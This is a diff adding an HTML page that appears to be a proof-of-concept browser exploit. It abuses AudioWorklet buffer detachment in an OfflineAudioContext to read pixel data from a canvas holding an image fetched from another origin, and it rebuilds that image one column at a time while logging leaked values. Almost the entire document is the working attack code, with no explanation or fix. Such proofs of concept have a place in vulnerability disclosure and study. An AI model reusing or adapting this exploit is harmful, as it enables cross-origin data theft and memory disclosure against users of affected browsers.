@@ -1,0 +1,147 @@
+<body>
+<script>
+/// Helper functions to convert between float and integer primitives
+var buf = new ArrayBuffer(8); // 8 byte array buffer
+var f32_buf = new Float32Array(buf);
+var u32_buf = new Uint32Array(buf);
+
+function ftoi(val1, val2) { // typeof(val) = float
+  f32_buf[1] = val1;
+  f32_buf[0] = val2;
+  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n); // Watch for little endianness
+}
+
+
+
+
+
+function runInWorket() {
+  class MyWorkletProcessor extends AudioWorkletProcessor {
+    constructor() {
+      super();
+
+      this.port.onmessage = event => {
+        this.bitmap = event.data;
+      }
+    }
+
+    detachBuffer(buffer) {
+      try {
+        this.port.postMessage([buffer], [buffer, this.port]);
+      } catch {}
+    }
+
+    process(inputs, outputs, params) {
+      this.detachBuffer(outputs[0][0].buffer);
+      this.port.postMessage(this.bitmap);
+      return false;
+    }
+  }
+
+  registerProcessor("my-worklet-processor", MyWorkletProcessor);
+}
+
+let blob = new Blob([`(${runInWorket}())`], {type: "text/javascript"});
+let url = URL.createObjectURL(blob);
+
+class MyWorkletNode extends AudioWorkletNode {
+  constructor(context) {
+    super(context, "my-worklet-processor", {channelCount: 1});
+  }
+}
+
+async function fetch(canvas, x, y) {
+  image_bitmap = await createImageBitmap(canvas, x, y, 1, 128);
+
+  audio_context = new OfflineAudioContext(1, 128, 3000);
+  await audio_context.audioWorklet.addModule(url);
+  oscillator = new OscillatorNode(audio_context);
+  node = new MyWorkletNode(audio_context);
+  node.port.postMessage(image_bitmap);
+
+  analyser = new AnalyserNode(audio_context);
+  oscillator.connect(node).connect(audio_context.destination);
+  audio_buffer = await audio_context.startRendering();
+  f32_chan = audio_buffer.getChannelData(0)
+  console.log("0x"+ftoi(f32_chan[0], f32_chan[1]).toString(16))
+  data = new Uint8Array(f32_chan.buffer);
+  return data;
+}
+
+// 0x15310000 0xf2a21e
+
+function go() {
+  original_image.src = target_url.value;
+  original_image.onload = async () => {
+    // canvas = document.createElement("canvas");
+    canvas.width = original_image.width;
+    canvas.height = Math.ceil(original_image.height/125)*125+3;
+    canvas_context = canvas.getContext("2d");
+    canvas_context.drawImage(original_image, 0, 2);
+    // document.body.appendChild(canvas);
+
+    const arr = new Uint8ClampedArray(original_image.width*4);
+    for (let i = 0; i < arr.length; i += 4) {
+      arr[i + 0] = 0;    // R value
+      arr[i + 1] = 190;  // G value
+      arr[i + 2] = 0;    // B value
+      arr[i + 3] = 255;  // A value
+    }
+    image_data = new ImageData(arr, original_image.width, 1)
+    canvas_context.putImageData(image_data, 0, 2);
+    // document.body.appendChild(canvas);
+
+
+    output_canvas = document.createElement("canvas");
+    output_canvas.width = original_image.width;
+    output_canvas.height = original_image.height;
+    output_canvas_context = output_canvas.getContext("2d");
+    document.body.appendChild(output_canvas);
+
+    for (let y = 3; y < original_image.height; y += 125) {
+      canvas_context.putImageData(image_data, 0, y-1);
+      for (let x = 0; x < original_image.width; x++) {
+        data = await fetch(canvas, x, y-3)
+
+        if (data[9] != 190) {
+          // console.log("Failure occured at", x, y)
+          x--; continue;
+        }
+
+        // fix colors
+        for (let i = 0; i < data.length; i += 4) {
+          let tmp = data[i + 0];
+          data[i + 0] = data[i + 2];
+          data[i + 2] = tmp;
+        }
+
+
+
+        out_data = new ImageData(image_bitmap.width, image_bitmap.height);
+        out_data.data.set(data);
+        canvas_context.putImageData(out_data, x, y-3);
+
+
+
+        data = data.subarray(12);
+        out_data = new ImageData(image_bitmap.width, image_bitmap.height-3);
+        out_data.data.set(data);
+        output_canvas_context.putImageData(out_data, x, y-3);
+      }
+    }
+  }
+}
+</script>
+<span>image url</span>
+<input id="target_url" size="100"
+value="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"/>
+<button onclick="go()">Go</button>
+
+<h2>original image</h1>
+<img id="original_image"/>
+
+<h2>working canvas</h1>
+<canvas id="canvas"></canvas>
+
+<h2>reconstructed image</h1>
+</body>
